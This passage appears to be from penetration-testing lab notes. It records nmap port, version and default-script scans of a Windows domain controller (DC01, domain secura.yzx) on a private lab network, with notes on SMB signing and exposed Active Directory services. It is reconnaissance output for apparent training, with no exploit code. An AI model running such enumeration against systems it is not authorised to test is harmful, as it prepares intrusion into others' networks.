	1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
	SF-Port3306-TCP:V=7.94SVN%I=7%D=10/9%Time=6706FF5E%P=x86_64-pc-linux-gnu%r
	SF:(NotesRPC,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.45\.201'\x20is\x20no
	SF:t\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server");
	Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
	
	Host script results:
	| smb2-security-mode: 
	|   3:1:1: 
	|_    Message signing enabled but not required
	|_clock-skew: 27s
	| smb2-time: 
	|   date: 2024-10-09T22:13:31
	|_  start_date: N/A
	
	NSE: Script Post-scanning.
	Initiating NSE at 18:13
	Completed NSE at 18:13, 0.00s elapsed
	Initiating NSE at 18:13
	Completed NSE at 18:13, 0.00s elapsed
	Initiating NSE at 18:13
	Completed NSE at 18:13, 0.00s elapsed
	Read data files from: /usr/bin/../share/nmap
	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 175.37 seconds
```



# 192.168.x.97

Domain: secura.yzx

#### Open Ports
```bash
nmap -v -p- -Pn --max-scan-delay=0 -oN 97/all_ports.txt 192.168.184.97
	PORT      STATE SERVICE
	53/tcp    open  domain
	88/tcp    open  kerberos-sec
	135/tcp   open  msrpc
	139/tcp   open  netbios-ssn
	389/tcp   open  ldap
	445/tcp   open  microsoft-ds
	464/tcp   open  kpasswd5
	593/tcp   open  http-rpc-epmap
	636/tcp   open  ldapssl
	3268/tcp  open  globalcatLDAP
	3269/tcp  open  globalcatLDAPssl
	5985/tcp  open  wsman
	9389/tcp  open  adws
	49665/tcp open  unknown
	49666/tcp open  unknown
	49668/tcp open  unknown
	49677/tcp open  unknown
	49678/tcp open  unknown
	49681/tcp open  unknown
	49708/tcp open  unknown
	49814/tcp open  unknown
```

#### Version & Default Scripts
```bash
nmap -Pn -sV -sC -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49665,49666,49668,49677,49678,49681,49708,49814 -oN 97/open_sVsC.txt 192.168.184.97
	PORT      STATE SERVICE      VERSION
	53/tcp    open  domain       Simple DNS Plus
	88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-10-04 21:11:46Z)
	135/tcp   open  msrpc        Microsoft Windows RPC
	139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
	389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: secura.yzx, Site: Default-First-Site-Name)
	445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: SECURA)
	464/tcp   open  kpasswd5?
	593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
	636/tcp   open  tcpwrapped
	3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: secura.yzx, Site: Default-First-Site-Name)
	3269/tcp  open  tcpwrapped
	5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	|_http-server-header: Microsoft-HTTPAPI/2.0
	|_http-title: Not Found
	9389/tcp  open  mc-nmf       .NET Message Framing
	49665/tcp open  msrpc        Microsoft Windows RPC
	49666/tcp open  msrpc        Microsoft Windows RPC
	49668/tcp open  msrpc        Microsoft Windows RPC
	49677/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
	49678/tcp open  msrpc        Microsoft Windows RPC
	49681/tcp open  msrpc        Microsoft Windows RPC
	49708/tcp open  msrpc        Microsoft Windows RPC
	49814/tcp open  msrpc        Microsoft Windows RPC
	Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
	
	Host script results:
	| smb2-security-mode: 
	|   3:1:1: 
	|_    Message signing enabled and required
	|_clock-skew: mean: 24s, deviation: 1s, median: 23s
	| smb2-time: 
	|   date: 2024-10-04T21:12:37
	|_  start_date: 2024-09-27T21:51:05
	| smb-os-discovery: 
	|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
	|   Computer name: dc01
	|   NetBIOS computer name: DC01\x00
	|   Domain name: secura.yzx                       # NOTE!
	|   Forest name: secura.yzx                       # NOTE!
	|   FQDN: dc01.secura.yzx                         # NOTE!
	|_  System time: 2024-10-04T21:12:38+00:00
	| smb-security-mode: 
	|   account_used: <blank>
	|   authentication_level: user
	|   challenge_response: supported
	|_  message_signing: required
```

